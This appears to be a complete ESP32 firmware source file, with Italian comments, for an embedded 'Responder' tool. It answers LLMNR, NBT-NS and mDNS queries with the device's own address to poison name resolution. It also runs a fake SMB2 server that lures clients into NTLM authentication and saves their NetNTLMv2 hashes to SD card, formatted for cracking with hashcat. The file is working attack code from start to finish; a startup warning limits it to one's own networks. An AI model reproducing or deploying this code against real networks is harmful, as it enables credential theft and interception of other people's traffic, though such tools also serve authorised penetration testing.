#include "Responder.h"

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_random.h>
#include <esp_wifi.h>

#include <cstdio>
#include <cstring>
#include <string>

#include "Display.h"
#include "Logger.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Storage.h"
#include "Ui.h"
#include "WifiExtCommon.h"
#include "WifiSetup.h"

#if ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE

namespace wifiext {
namespace {

constexpr const char* kHashPath = "/wifiext/ntlm.txt";
constexpr uint16_t kLlmnrPort = 5355;
constexpr uint16_t kNbtPort = 137;
constexpr uint16_t kMdnsPort = 5353;
constexpr size_t kUdpMax = 640;

WiFiUDP g_llmnr;
WiFiUDP g_nbt;
WiFiUDP g_mdns;

uint32_t g_llmnrCount = 0;
uint32_t g_nbtCount = 0;
uint32_t g_mdnsCount = 0;
bool g_llmnrOk = false;
bool g_nbtOk = false;
bool g_mdnsOk = false;

// --- SMB2 minimale ----------------------------------------------------------
// Serve solo a portare il client fino all'autenticazione NTLM: si risponde al
// NEGOTIATE, si manda il Type2 con la challenge e si legge il Type3.

constexpr size_t kSmbMaxMsg = 1536;
constexpr uint64_t kSmbSessionId = 0x4F524249540001ULL;
constexpr uint32_t kStatusMoreProcessing = 0xC0000016u;
constexpr uint32_t kStatusNotSupported = 0xC00000BBu;

WiFiServer g_smbServer(445);
WiFiClient g_smbClient;
uint8_t g_smbPrefix[4] = {0};
uint8_t g_smbPrefixGot = 0;
uint8_t g_smbPayload[kSmbMaxMsg] = {0};
uint16_t g_smbNeed = 0;
uint16_t g_smbHave = 0;
uint8_t g_challenge[8] = {0};
uint32_t g_smbLastActivity = 0;
uint32_t g_smbSessions = 0;
uint32_t g_hashesWritten = 0;
uint32_t g_hashesCaptured = 0;
uint32_t g_skipped = 0;

uint16_t be16(const uint8_t* p) {
    return static_cast<uint16_t>((p[0] << 8) | p[1]);
}

void putBe16(uint8_t* p, uint16_t value) {
    p[0] = static_cast<uint8_t>(value >> 8);
    p[1] = static_cast<uint8_t>(value & 0xFF);
}

void putBe32(uint8_t* p, uint32_t value) {
    p[0] = static_cast<uint8_t>(value >> 24);
    p[1] = static_cast<uint8_t>((value >> 16) & 0xFF);
    p[2] = static_cast<uint8_t>((value >> 8) & 0xFF);
    p[3] = static_cast<uint8_t>(value & 0xFF);
}

uint16_t le16(const uint8_t* p) {
    return static_cast<uint16_t>(p[0] | (p[1] << 8));
}

uint32_t le32(const uint8_t* p) {
    return static_cast<uint32_t>(p[0]) | (static_cast<uint32_t>(p[1]) << 8) |
           (static_cast<uint32_t>(p[2]) << 16) |
           (static_cast<uint32_t>(p[3]) << 24);
}

uint64_t le64(const uint8_t* p) {
    return static_cast<uint64_t>(le32(p)) |
           (static_cast<uint64_t>(le32(p + 4)) << 32);
}

void putLe16(uint8_t* p, uint16_t value) {
    p[0] = static_cast<uint8_t>(value & 0xFF);
    p[1] = static_cast<uint8_t>(value >> 8);
}

void putLe32(uint8_t* p, uint32_t value) {
    p[0] = static_cast<uint8_t>(value & 0xFF);
    p[1] = static_cast<uint8_t>((value >> 8) & 0xFF);
    p[2] = static_cast<uint8_t>((value >> 16) & 0xFF);
    p[3] = static_cast<uint8_t>((value >> 24) & 0xFF);
}

void putLe64(uint8_t* p, uint64_t value) {
    putLe32(p, static_cast<uint32_t>(value & 0xFFFFFFFFULL));
    putLe32(p + 4, static_cast<uint32_t>(value >> 32));
}

void ipOctets(const IPAddress& ip, uint8_t out[4]) {
    out[0] = ip[0];
    out[1] = ip[1];
    out[2] = ip[2];
    out[3] = ip[3];
}

// Fine del nome DNS a partire da pos (dopo lo zero finale), 0 se malformato.
// Il nome massimo DNS e' 255 byte incluso lo zero finale.
size_t skipDnsName(const uint8_t* data, size_t len, size_t pos) {
    const size_t start = pos;
    size_t guard = 0;
    while (pos < len && guard++ < 128) {
        const uint8_t label = data[pos];
        if (label == 0) {
            return (pos - start + 1) <= 255 ? pos + 1 : 0;
        }
        if ((label & 0xC0) != 0 || label > 63) {
            return 0;  // query compresse: non gestite
        }
        pos += static_cast<size_t>(label) + 1;
        if (pos - start > 255) {
            return 0;
        }
    }
    return 0;
}

// --- Responder UDP ----------------------------------------------------------

void handleLlmnr() {
    const int available = g_llmnr.parsePacket();
    if (available <= 0) {
        return;
    }
    uint8_t in[kUdpMax];
    const int n = g_llmnr.read(in, sizeof(in));
    if (n < 12 || (in[2] & 0x80) != 0 || be16(in + 4) < 1) {
        return;
    }
    const size_t nameEnd = skipDnsName(in, static_cast<size_t>(n), 12);
    if (nameEnd == 0 || nameEnd + 4 > static_cast<size_t>(n)) {
        return;
    }
    const uint16_t qtype = be16(in + nameEnd);
    if (qtype != 1 && qtype != 255) {
        return;
    }
    uint8_t out[kUdpMax];
    const size_t nameLen = nameEnd - 12;
    // 2*nameLen (domanda + risposta) + 30 byte di header/record.
    if (nameLen == 0 || nameLen > 255 || 2 * nameLen + 30 > sizeof(out)) {
        return;
    }
    memcpy(out, in, 4);
    putBe16(out + 2, 0x8000);
    putBe16(out + 4, 1);
    putBe16(out + 6, 1);
    putBe16(out + 8, 0);
    putBe16(out + 10, 0);
    memcpy(out + 12, in + 12, nameLen + 4);
    size_t offset = 12 + nameLen + 4;
    // LLMNR non ammette compressione dei nomi: la risposta ripete il nome.
    memcpy(out + offset, in + 12, nameLen);
    offset += nameLen;
    putBe16(out + offset, 1);  // A
    offset += 2;
    putBe16(out + offset, 1);  // IN
    offset += 2;
    putBe32(out + offset, 30);  // TTL
    offset += 4;
    putBe16(out + offset, 4);
    offset += 2;
    uint8_t octets[4];
    ipOctets(WiFi.localIP(), octets);
    memcpy(out + offset, octets, 4);
    offset += 4;

    g_llmnr.beginPacket(g_llmnr.remoteIP(), g_llmnr.remotePort());
    g_llmnr.write(out, offset);
    g_llmnr.endPacket();
    ++g_llmnrCount;
}

void handleNbt() {
    const int available = g_nbt.parsePacket();
    if (available <= 0) {
        return;
    }
    uint8_t in[256];
    const int n = g_nbt.read(in, sizeof(in));
    // header 12 + nome NetBIOS 34 + type/class 4
    if (n < 50 || (in[2] & 0x80) != 0 || be16(in + 4) < 1 || in[12] != 0x20) {
        return;
    }
    const uint16_t qtype = be16(in + 46);
    const uint16_t qclass = be16(in + 48);
    if (qclass != 1 || (qtype != 0x0020 && qtype != 0x0001)) {
        return;
    }

    uint8_t out[128];
    memcpy(out, in, 12);
    putBe16(out + 2, 0x8500);
    putBe16(out + 4, 1);
    putBe16(out + 6, 1);
    putBe16(out + 8, 0);
    putBe16(out + 10, 0);
    memcpy(out + 12, in + 12, 38);
    size_t offset = 50;
    memcpy(out + offset, in + 12, 34);  // stesso nome
    offset += 34;
    putBe16(out + offset, 0x0020);  // NB
    offset += 2;
    putBe16(out + offset, 0x0001);  // IN
    offset += 2;
    putBe32(out + offset, 300);
    offset += 4;
    putBe16(out + offset, 6);
    offset += 2;
    putBe16(out + offset, 0x0000);  // nodo B, indirizzo unico
    offset += 2;
    uint8_t octets[4];
    ipOctets(WiFi.localIP(), octets);
    memcpy(out + offset, octets, 4);
    offset += 4;

    g_nbt.beginPacket(g_nbt.remoteIP(), g_nbt.remotePort());
    g_nbt.write(out, offset);
    g_nbt.endPacket();
    ++g_nbtCount;
}

void handleMdns() {
    const int available = g_mdns.parsePacket();
    if (available <= 0) {
        return;
    }
    uint8_t in[kUdpMax];
    const int n = g_mdns.read(in, sizeof(in));
    if (n < 12 || (in[2] & 0x80) != 0 || be16(in + 4) < 1) {
        return;
    }
    const size_t nameEnd = skipDnsName(in, static_cast<size_t>(n), 12);
    if (nameEnd == 0 || nameEnd + 4 > static_cast<size_t>(n)) {
        return;
    }
    if (be16(in + nameEnd) != 1) {
        return;  // solo record A
    }
    const size_t nameLen = nameEnd - 12;
    uint8_t out[kUdpMax];
    if (nameLen == 0 || nameLen > 255 || nameLen + 32 > sizeof(out)) {
        return;
    }
    const bool unicastResponse = (be16(in + nameEnd + 2) & 0x8000) != 0;
    memcpy(out, in, 4);
    putBe16(out + 2, 0x8400);
    putBe16(out + 4, 1);
    putBe16(out + 6, 1);
    putBe16(out + 8, 0);
    putBe16(out + 10, 0);
    memcpy(out + 12, in + 12, nameLen + 4);
    putBe16(out + 12 + nameLen + 2, 1);  // classe senza bit QU nella risposta
    size_t offset = 12 + nameLen + 4;
    out[offset++] = 0xC0;  // puntatore al nome della domanda
    out[offset++] = 0x0C;
    putBe16(out + offset, 1);
    offset += 2;
    putBe16(out + offset, 1);
    offset += 2;
    putBe32(out + offset, 120);
    offset += 4;
    putBe16(out + offset, 4);
    offset += 2;
    uint8_t octets[4];
    ipOctets(WiFi.localIP(), octets);
    memcpy(out + offset, octets, 4);
    offset += 4;

    if (unicastResponse) {
        g_mdns.beginPacket(g_mdns.remoteIP(), g_mdns.remotePort());
    } else {
        g_mdns.beginPacket(IPAddress(224, 0, 0, 251), kMdnsPort);
    }
    g_mdns.write(out, offset);
    g_mdns.endPacket();
    ++g_mdnsCount;
}

// --- SMB2 -------------------------------------------------------------------

void smbDrop() {
    g_smbClient.stop();
    g_smbPrefixGot = 0;
    g_smbNeed = 0;
    g_smbHave = 0;
}

void smbSend(const uint8_t* data, size_t len) {
    const uint8_t prefix[4] = {0, static_cast<uint8_t>(len >> 16),
                               static_cast<uint8_t>(len >> 8),
                               static_cast<uint8_t>(len)};
    g_smbClient.write(prefix, sizeof(prefix));
    g_smbClient.write(data, len);
    g_smbClient.flush();
}

void smbHeader(uint8_t* out, uint16_t command, uint32_t status, uint64_t messageId,
               uint64_t sessionId) {
    memset(out, 0, 64);
    out[0] = 0xFE;
    out[1] = 'S';
    out[2] = 'M';
    out[3] = 'B';
    putLe16(out + 4, 64);
    putLe16(out + 6, 1);
    putLe32(out + 8, status);
    putLe16(out + 12, command);
    putLe16(out + 14, 1);
    putLe32(out + 16, 0x00000001);  // risposta del server
    putLe64(out + 24, messageId);
    putLe64(out + 40, sessionId);
}

size_t putAvPair(uint8_t* out, uint16_t id, const char* text) {
    const size_t chars = strlen(text);
    putLe16(out, id);
    putLe16(out + 2, static_cast<uint16_t>(chars * 2));
    for (size_t i = 0; i < chars; ++i) {
        out[4 + i * 2] = static_cast<uint8_t>(text[i]);
        out[5 + i * 2] = 0;
    }
    return 4 + chars * 2;
}

size_t buildType2(uint8_t* out) {
    memset(out, 0, 112);
    memcpy(out, "NTLMSSP\0", 8);
    putLe32(out + 8, 2);
    putLe16(out + 12, 0);
    putLe16(out + 14, 0);
    putLe32(out + 16, 56);
    // Unicode, request target, NTLM, always sign, extended session security,
    // target info.
    putLe32(out + 20, 0x00888205);
    memcpy(out + 24, g_challenge, 8);
    size_t offset = 56;
    offset += putAvPair(out + offset, 1, "ORBIT");      // NbComputerName
    offset += putAvPair(out + offset, 2, "WORKGROUP");  // NbDomainName
    out[offset++] = 0;
    out[offset++] = 0;  // MsvAvEOL
    const uint16_t infoLen = static_cast<uint16_t>(offset - 56);
    putLe16(out + 40, infoLen);
    putLe16(out + 42, infoLen);
    putLe32(out + 44, 56);
    return offset;
}

std::string utf16Ascii(const uint8_t* data, size_t bytes) {
    std::string out;
    out.reserve(bytes / 2);
    for (size_t i = 0; i + 1 < bytes; i += 2) {
        const uint16_t code = le16(data + i);
        if (code == 0) {
            break;
        }
        out.push_back(code < 128 ? static_cast<char>(code) : '?');
    }
    return out;
}

std::string safeField(std::string text) {
    if (text.size() > 64) {
        text.resize(64);
    }
    for (char& c : text) {
        if (c == ':' || c == '\n' || c == '\r' || static_cast<uint8_t>(c) < 0x20) {
            c = '_';
        }
    }
    return text;
}

bool appendHash(const std::string& line) {
    if (!storage::hasSD()) {
        return false;
    }
    std::string data;
    if (!storage::exists(kHashPath, true)) {
        data = "# ORBIT OS Responder - NetNTLMv2, hashcat -m 5600\n";
    }
    data += line;
    data += '\n';
    return appendSd(kHashPath, data);
}

void captureType3(const uint8_t* ntlm, size_t len, uint64_t messageId) {
    if (len < 52) {
        ++g_skipped;
        return;
    }
    const uint16_t ntLen = le16(ntlm + 20);
    const uint32_t ntOff = le32(ntlm + 24);
    const uint16_t domainLen = le16(ntlm + 28);
    const uint32_t domainOff = le32(ntlm + 32);
    const uint16_t userLen = le16(ntlm + 36);
    const uint32_t userOff = le32(ntlm + 40);

    // NetNTLMv2: 16 byte di proof + blob (almeno 28 byte). Le risposte
    // NTLMv1 da 24 byte (formato 5500) non vanno scritte in un file 5600.
    const auto inRange = [len](uint32_t offset, uint16_t size) {
        return offset <= len && size <= len - offset;
    };
    if (ntLen < 44 || ntLen > 512 || !inRange(ntOff, ntLen) ||
        !inRange(domainOff, domainLen) || !inRange(userOff, userLen)) {
        ++g_skipped;
        return;
    }

    const std::string user = safeField(utf16Ascii(ntlm + userOff, userLen));
    const std::string domain = safeField(utf16Ascii(ntlm + domainOff, domainLen));
    const std::string challenge = hexBytes(g_challenge, 8);
    const std::string proof = hexBytes(ntlm + ntOff, 16);
    const std::string blob = hexBytes(ntlm + ntOff + 16, ntLen - 16);
    const std::string line =
        user + "::" + domain + ":" + challenge + ":" + proof + ":" + blob;
    ++g_hashesCaptured;
    if (appendHash(line)) {
        ++g_hashesWritten;
    }

    uint8_t out[72];
    smbHeader(out, 1, 0, messageId, kSmbSessionId);
    putLe16(out + 64, 9);
    putLe16(out + 66, 0);
    putLe16(out + 68, 72);
    putLe16(out + 70, 0);
    smbSend(out, sizeof(out));
    smbDrop();
}

void smbProcess(uint8_t* message, size_t len) {
    if (len < 64 || message[0] != 0xFE || message[1] != 'S' ||
        message[2] != 'M' || message[3] != 'B') {
        return;
    }
    const uint16_t command = le16(message + 12);
    const uint64_t messageId = le64(message + 24);

    if (command == 0) {  // NEGOTIATE
        uint8_t out[128];
        memset(out, 0, sizeof(out));
        smbHeader(out, 0, 0, messageId, 0);
        putLe16(out + 64, 65);
        putLe16(out + 66, 1);      // signing abilitato
        putLe16(out + 68, 0x0210);  // SMB 2.1
        static const uint8_t kGuid[16] = {0x4F, 0x52, 0x42, 0x49, 0x54, 0x2D, 0x57, 0x49,
                                          0x46, 0x49, 0x45, 0x58, 0x54, 0x00, 0x01, 0x01};
        memcpy(out + 72, kGuid, sizeof(kGuid));
        putLe32(out + 88, 0);      // capabilities
        putLe32(out + 92, 65536);  // max transact
        putLe32(out + 96, 65536);  // max read
        putLe32(out + 100, 65536);  // max write
        putLe16(out + 120, 128);   // security buffer offset
        putLe16(out + 122, 0);     // security buffer length
        smbSend(out, sizeof(out));
        return;
    }

    if (command != 1) {  // SESSION_SETUP
        uint8_t out[64];
        smbHeader(out, command, kStatusNotSupported, messageId, kSmbSessionId);
        smbSend(out, sizeof(out));
        return;
    }

    if (len < 64 + 24) {
        return;
    }
    // SESSION_SETUP request (MS-SMB2 2.2.5): Capabilities a +68, Channel a +72,
    // SecurityBufferOffset a +76, SecurityBufferLength a +78, buffer a +88.
    const uint16_t securityOffset = le16(message + 76);
    const uint16_t securityLength = le16(message + 78);
    if (securityOffset < 88 || securityLength < 12 ||
        static_cast<size_t>(securityOffset) + securityLength > len) {
        return;
    }

    // Windows puo' incapsulare il token in SPNEGO: si cerca la firma NTLMSSP.
    size_t ntlmOffset = 0;
    bool found = false;
    const size_t end = static_cast<size_t>(securityOffset) + securityLength;
    for (size_t pos = securityOffset; pos + 12 <= end; ++pos) {
        if (memcmp(message + pos, "NTLMSSP\0", 8) == 0) {
            ntlmOffset = pos;
            found = true;
            break;
        }
    }
    if (!found) {
        ++g_skipped;
        return;
    }

    const uint32_t type = le32(message + ntlmOffset + 8);
    if (type == 1) {
        esp_fill_random(g_challenge, sizeof(g_challenge));
        uint8_t out[64 + 8 + 112];
        memset(out, 0, sizeof(out));
        smbHeader(out, 1, kStatusMoreProcessing, messageId, kSmbSessionId);
        const size_t type2Len = buildType2(out + 72);
        putLe16(out + 64, 9);
        putLe16(out + 66, 0);
        putLe16(out + 68, 72);
        putLe16(out + 70, static_cast<uint16_t>(type2Len));
        smbSend(out, 72 + type2Len);
        ++g_smbSessions;
    } else if (type == 3) {
        captureType3(message + ntlmOffset, end - ntlmOffset, messageId);
    } else {
        ++g_skipped;
    }
}

void smbPump() {
    if (!g_smbClient) {
        WiFiClient incoming = g_smbServer.available();
        if (!incoming) {
            return;
        }
        g_smbClient = incoming;
        g_smbPrefixGot = 0;
        g_smbNeed = 0;
        g_smbHave = 0;
        g_smbLastActivity = millis();
        return;
    }

    if (millis() - g_smbLastActivity > 4000) {
        smbDrop();
        return;
    }
    if (!g_smbClient.connected() && !g_smbClient.available()) {
        smbDrop();
        return;
    }

    for (int guard = 0; guard < 16; ++guard) {
        if (!g_smbClient.available()) {
            break;
        }
        if (g_smbPrefixGot < 4) {
            const int got =
                g_smbClient.read(g_smbPrefix + g_smbPrefixGot, 4 - g_smbPrefixGot);
            if (got <= 0) {
                break;
            }
            g_smbPrefixGot = static_cast<uint8_t>(g_smbPrefixGot + got);
            g_smbLastActivity = millis();
            if (g_smbPrefixGot == 4) {
                const uint32_t size = (static_cast<uint32_t>(g_smbPrefix[0]) << 16) |
                                      (static_cast<uint32_t>(g_smbPrefix[1]) << 8) |
                                      g_smbPrefix[2];
                if (size == 0 || size > kSmbMaxMsg) {
                    smbDrop();
                    break;
                }
                g_smbNeed = static_cast<uint16_t>(size);
                g_smbHave = 0;
            }
        } else {
            const int got =
                g_smbClient.read(g_smbPayload + g_smbHave, g_smbNeed - g_smbHave);
            if (got <= 0) {
                break;
            }
            g_smbHave = static_cast<uint16_t>(g_smbHave + got);
            g_smbLastActivity = millis();
            if (g_smbHave == g_smbNeed) {
                smbProcess(g_smbPayload, g_smbNeed);
                g_smbPrefixGot = 0;
                g_smbNeed = 0;
                g_smbHave = 0;
                if (!g_smbClient) {
                    break;
                }
            }
        }
    }
}

// --- UI ---------------------------------------------------------------------

void drawResponder(const std::string& ip, bool socketsOk) {
    display::clear();
    display::header("Responder", "WiFi+");
    display::text(8, 26, "IP: " + ip, display::kAccent, 0);
    display::text(8, 42,
                  "LLMNR " + std::to_string(g_llmnrCount) + "   NBT " +
                      std::to_string(g_nbtCount) + "   mDNS " +
                      std::to_string(g_mdnsCount),
                  display::kText, 0);
    display::text(8, 56,
                  "SMB auth " + std::to_string(g_smbSessions) + "   Hash " +
                      std::to_string(g_hashesCaptured),
                  display::kText, 0);
    if (g_skipped > 0) {
        display::text(8, 70, "Scartati: " + std::to_string(g_skipped) +
                                 " (NTLMv1 o malformati)",
                      display::kTextDim, 0);
    } else {
        display::text(8, 70, "File: /wifiext/ntlm.txt", display::kTextDim, 0);
    }
    if (!storage::hasSD()) {
        display::text(8, 86, "!SD assente: hash non salvati", display::kWarning, 0);
    } else if (g_hashesWritten != g_hashesCaptured) {
        display::text(8, 86, "!Scrittura hash fallita", display::kWarning, 0);
    } else {
        display::text(8, 86, sdFreeText(), display::kTextDim, 0);
    }
    if (!socketsOk) {
        display::text(8, 100, "!Socket parziale: vedi log", display::kWarning, 0);
    } else {
        display::text(8, 100, "Solo reti proprie / autorizzate", display::kWarning, 0);
    }
    display::footer("ESC = ferma");
    display::push();
}

}  // namespace

void runResponder() {
    if (!ui::legalWarning("Responder (LLMNR/NBT-NS/mDNS)",
                          {"Avvelena la risoluzione dei nomi",
                           "e simula SMB per catturare hash",
                           "NTLMv2. Solo reti proprie."},
                          "WiFi+")) {
        return;
    }
    if (!wifisetup::ensureConnected(true, "WiFi+")) {
        wifisetup::disconnect();  // nessuna radio lasciata accesa su annulla/errore
        ui::message("Responder", {"WiFi non connesso.", "Serve una rete per ricevere",
                                  "le query dei client."},
                    "WiFi+");
        return;
    }
    WiFi.setSleep(false);
    ensureDir();

    g_llmnrCount = 0;
    g_nbtCount = 0;
    g_mdnsCount = 0;
    g_smbSessions = 0;
    g_hashesWritten = 0;
    g_hashesCaptured = 0;
    g_skipped = 0;
    g_llmnrOk = g_llmnr.beginMulticast(IPAddress(224, 0, 0, 252), kLlmnrPort) != 0;
    g_nbtOk = g_nbt.begin(kNbtPort) != 0;
    g_mdnsOk = g_mdns.beginMulticast(IPAddress(224, 0, 0, 251), kMdnsPort) != 0;
    if (!g_llmnrOk) {
        logger::warn("Responder: porta LLMNR 5355 non disponibile");
    }
    if (!g_nbtOk) {
        logger::warn("Responder: porta NBT-NS 137 non disponibile");
    }
    if (!g_mdnsOk) {
        logger::warn("Responder: porta mDNS 5353 non disponibile");
    }
    g_smbServer.begin();
    g_smbServer.setNoDelay(true);
    smbDrop();

    const std::string ip = WiFi.localIP().toString().c_str();
    const bool socketsOk = g_llmnrOk && g_nbtOk && g_mdnsOk;
    logger::info("Responder avviato su %s", ip.c_str());

    uint32_t lastDraw = 0;
    navigation::waitRelease();
    for (;;) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        if (g_llmnrOk) {
            handleLlmnr();
        }
        if (g_nbtOk) {
            handleNbt();
        }
        if (g_mdnsOk) {
            handleMdns();
        }
        smbPump();

        const uint32_t now = millis();
        if (now - lastDraw > 300) {
            drawResponder(ip, socketsOk);
            lastDraw = now;
        }
        delay(4);
    }

    g_llmnr.stop();
    g_nbt.stop();
    g_mdns.stop();
    g_smbServer.end();
    smbDrop();
    wifisetup::disconnect();
    logger::info("Responder fermato: LLMNR %u, NBT %u, mDNS %u, hash %u",
                 static_cast<unsigned>(g_llmnrCount), static_cast<unsigned>(g_nbtCount),
                 static_cast<unsigned>(g_mdnsCount),
                 static_cast<unsigned>(g_hashesWritten));
}

}  // namespace wifiext

#endif  // ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE
